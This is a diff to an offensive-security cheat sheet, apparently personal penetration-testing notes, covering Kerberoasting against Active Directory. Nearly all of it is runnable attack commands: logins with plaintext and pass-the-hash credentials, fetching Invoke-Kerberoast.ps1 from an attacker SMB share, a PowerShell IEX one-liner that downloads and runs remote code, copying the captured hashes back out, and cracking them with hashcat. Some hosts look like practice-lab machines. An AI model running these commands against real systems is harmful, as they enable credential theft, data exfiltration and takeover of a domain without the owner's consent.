@@ -227,7 +227,8 @@ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
 
 
 ===================================
-Easy Roast (requires cred/hash/ticket) 
+Quick-Roast (requires creds)
+Need credentials for a domain user/service 
 
 echo "192.168.200.5 mike.com" >> /etc/hosts  
 GetUserSPNs.py -request domain/SVC_TGS  
@@ -270,14 +271,27 @@ psexec.py active.htb/administrator@10.10.10.100
 
 
 ===================================
-Kerberoast Powershell
+Invoke-Kerberoast.ps1  - Hailmary
 
-Import-Module ./Invoke-Kerberoast.ps1  
+Requires an admin/login on an AD box (you used mimikatz, right?) 
+Don't need the actual administrator Password.
+Can enumerate all service principal names in the domain, request service tickets
+Export them in a format ready for cracking in both John the Ripper and Hashcat
+Completely eliminating the need for Mimikatz in this attack. 
+
+psexec administrator@192.168.200.5 -hashes aad3b4356:aad3b435
+smbup 
+copy \\192.168.119.154\share\Invoke-Kerberoast.ps1  
+powershell.exe -nop -exec bypass  
+Import-Module .\Invoke-Kerberoast.ps1  
 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII khash0.txt  
+copy khash0.txt \\192.168.119.154\share\  
+hashcat -m 13100 -a 0 khash0.txt $rockyou --force    
 
 Faster: 
 powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"  
- 
+
+
 ===================================
 Crack
 
